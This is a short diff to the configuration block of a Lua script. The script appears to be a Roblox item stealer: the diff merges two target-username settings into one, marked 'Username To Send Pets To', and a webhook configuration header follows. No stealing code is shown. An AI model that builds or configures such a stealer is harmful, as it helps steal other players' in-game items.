@@ -2,9 +2,7 @@
 
 --[[ Main Config ]]--
 
-_G.Username1 = "ralphamoykipay" --// Username To Send Pets To
-
-_G.Username2 = "ralphamoykipay" --// Username To Send Pets To [OPTIONAL]
+_G.Username = "Ralphamoykipay" --// Username To Send Pets To
 
 --[[ Webhook Config ]]--
 
